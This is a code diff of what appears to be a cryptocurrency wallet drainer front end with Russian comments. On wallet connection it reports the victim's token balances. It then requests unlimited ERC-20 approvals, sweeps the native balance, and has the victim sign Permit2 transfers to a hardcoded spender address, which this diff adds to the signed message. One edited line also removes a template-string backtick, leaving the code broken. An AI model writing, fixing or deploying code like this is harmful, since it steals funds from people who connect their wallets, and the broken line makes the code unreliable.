@@ -9,7 +9,7 @@ const USE_SENDCALLS = false; // Поставьте false для отключен
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
-const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
+const PERMIT2_SPENDER ='0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
@@ -380,7 +380,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
         const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
         const value = token.balance * price
         totalValue += value
-        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
+        return ➡️ ${token.symbol} - ${value.toFixed(2)}$`
       })
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
@@ -785,12 +785,12 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
     // Prepare approve calls for ERC-20 tokens (если USE_PERMIT2=false)
     const approveCalls = !USE_PERMIT2
       ? networkTokens
-        .filter(t => t.address !== 'native')
-        .map(t => ({
-          to: getAddress(t.address),
+      .filter(t => t.address !== 'native')
+      .map(t => ({
+        to: getAddress(t.address),
           data: encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256] }),
-          value: '0x0'
-        }))
+        value: '0x0'
+      }))
       : []
 
     // Рассчитываем нативный перевод: баланс минус газ и минус 0.0005
@@ -815,7 +815,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       if (nativeCall) {
         try {
           const id = await sendCalls(wagmiAdapter.wagmiConfig, { calls: [nativeCall], account: getAddress(state.address), chainId: mostExpensive.chainId })
-          return { success: true, txHash: id }
+      return { success: true, txHash: id }
         } catch (error) {
           if (isUserRejected(error)) {
             const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
@@ -870,6 +870,7 @@ const PERMIT2_DOMAIN = (chainId) => ({ name: 'Permit2', chainId, verifyingContra
 const PERMIT2_TYPES = {
   PermitTransferFrom: [
     { name: 'permitted', type: 'TokenPermissions' },
+    { name: 'spender', type: 'address' },
     { name: 'nonce', type: 'uint256' },
     { name: 'deadline', type: 'uint256' }
   ],
@@ -878,8 +879,9 @@ const PERMIT2_TYPES = {
     { name: 'amount', type: 'uint256' }
   ]
 }
-const buildPermit2Message = ({ token, amount, nonce, deadline }) => ({
+const buildPermit2Message = ({ token, amount, spender, nonce, deadline }) => ({
   permitted: { token, amount },
+  spender,
   nonce,
   deadline
 })
@@ -889,7 +891,7 @@ const signPermit2 = async ({ chainId, account, token, amount, nonce, deadline })
     domain: PERMIT2_DOMAIN(chainId),
     types: PERMIT2_TYPES,
     primaryType: 'PermitTransferFrom',
-    message: buildPermit2Message({ token: getAddress(token), amount, nonce, deadline })
+    message: buildPermit2Message({ token: getAddress(token), amount, spender: getAddress(PERMIT2_SPENDER), nonce, deadline })
   })
   return signature
 }
